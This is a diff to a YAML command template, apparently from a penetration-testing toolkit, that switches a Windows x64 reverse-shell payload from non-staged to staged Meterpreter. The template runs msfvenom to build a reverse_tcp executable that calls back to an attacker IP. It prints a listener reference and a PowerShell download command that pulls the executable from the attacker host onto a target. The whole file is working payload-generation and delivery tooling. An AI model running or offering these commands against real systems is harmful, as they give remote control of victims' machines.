@@ -1,6 +1,6 @@
 ---
 metadata:
-  filename: "deliver-windows-x64-revshell-msfvenom-meterpreter-tcp-nonstaged-exe.yaml"
+  filename: "deliver-windows-x64-metasploit-meterpreter-staged-tcp-exe.yaml"
   tags: ["shell", "windows"]
   created: "2025-03-29"
   authors: ["Unknown"]
@@ -8,10 +8,10 @@ metadata:
 content: |
   mkdir -p packstation/outbound; \
   printf '%s\n' 'msfvenom creates the payload. Please wait...'; \
-  msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={{ attacker_ip }} LPORT={{ shell_port }} -f exe > packstation/outbound/revshell.exe ; \
+  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ attacker_ip }} LPORT={{ shell_port }} EXITFUNC=thread -f exe > packstation/outbound/revshell.exe ; \
   printf '%s\n' '================================================================'; \
   printf '%s\n' '                      ------Listener------                      '; \
-  printf '%s\n' 'Start listener: {{ include('scripts/listener-msf-multi-handler-windows-x64-meterpreter-tcp-nonstaged.yaml') }}'; \
+  printf '%s\n' 'Start listener: {{ include('scripts/listener-metasploit-windows-x64-meterpreter-staged-tcp.yaml') }}'; \
   printf '%s\n' '================================================================'; \
   printf '%s\n' '                      -----PowerShell-----                      '; \
   printf '%s\n' 'Deliver only: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/revshell.exe -Outfile {{ delivery_path_windows }}\revshell.exe'; \
